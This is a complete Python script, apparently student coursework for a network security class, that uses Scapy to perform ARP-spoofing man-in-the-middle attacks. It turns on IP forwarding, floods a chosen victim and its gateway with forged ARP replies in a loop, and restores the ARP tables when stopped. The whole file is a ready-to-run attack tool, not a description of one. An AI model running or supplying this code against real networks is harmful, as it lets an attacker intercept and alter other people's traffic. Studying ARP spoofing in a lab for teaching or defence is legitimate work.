python#!/usr/bin/env python3
# ============================================================
#  ARP MitM - Emely Ventura 20241140
#  Materia: Seguridad de redes
#  Maestro: Jonathan Esteban Rondon Corniel
#  Fecha: 01 de junio de 2026
# ============================================================

from scapy.all import ARP, Ether, sendp, srp
import time, sys, os

def banner():
    print("=" * 50)
    print("  ARP MitM - Emely Ventura 20241140")
    print("  Materia: Seguridad de redes")
    print("=" * 50)

def get_mac(ip, iface):
    arp_req = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    ans, _ = srp(arp_req, timeout=2, iface=iface, verbose=False)
    for _, rcv in ans:
        return rcv[Ether].src
    return None

def spoof(target_ip, spoof_ip, iface):
    target_mac = get_mac(target_ip, iface)
    if target_mac is None:
        print(f"[!] No se pudo obtener MAC de {target_ip}")
        return
    pkt = Ether(dst=target_mac) / ARP(
        op=2,
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip
    )
    sendp(pkt, iface=iface, verbose=False)

def restore(target_ip, gateway_ip, iface):
    target_mac  = get_mac(target_ip,  iface)
    gateway_mac = get_mac(gateway_ip, iface)
    if target_mac and gateway_mac:
        pkt1 = Ether(dst=target_mac) / ARP(
            op=2, pdst=target_ip, hwdst=target_mac,
            psrc=gateway_ip, hwsrc=gateway_mac)
        pkt2 = Ether(dst=gateway_mac) / ARP(
            op=2, pdst=gateway_ip, hwdst=gateway_mac,
            psrc=target_ip, hwsrc=target_mac)
        sendp(pkt1, iface=iface, verbose=False, count=5)
        sendp(pkt2, iface=iface, verbose=False, count=5)
        print("[*] Tablas ARP restauradas.")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Uso: python3 arp_mitm.py <IP_VICTIMA> <IP_GATEWAY> <INTERFAZ>")
        print("Ejemplo: python3 arp_mitm.py 10.24.11.2 10.24.11.1 eth1")
        sys.exit(1)

    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    TARGET_IP  = sys.argv[1]
    GATEWAY_IP = sys.argv[2]
    IFACE      = sys.argv[3]

    banner()
    print(f"[*] Objetivo : {TARGET_IP}")
    print(f"[*] Gateway  : {GATEWAY_IP}")
    print(f"[*] Interfaz : {IFACE}")
    print("[*] Iniciando... Ctrl+C para detener\n")

    paquetes = 0
    try:
        while True:
            spoof(TARGET_IP,  GATEWAY_IP, IFACE)
            spoof(GATEWAY_IP, TARGET_IP,  IFACE)
            paquetes += 2
            print(f"\r[*] Paquetes enviados: {paquetes}", end="")
            time.sleep(0.01)
    except KeyboardInterrupt:
        print(f"\n[!] Ataque detenido. Total: {paquetes} paquetes.")
        print("[*] Restaurando tablas ARP...")
        restore(TARGET_IP, GATEWAY_IP, IFACE)
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
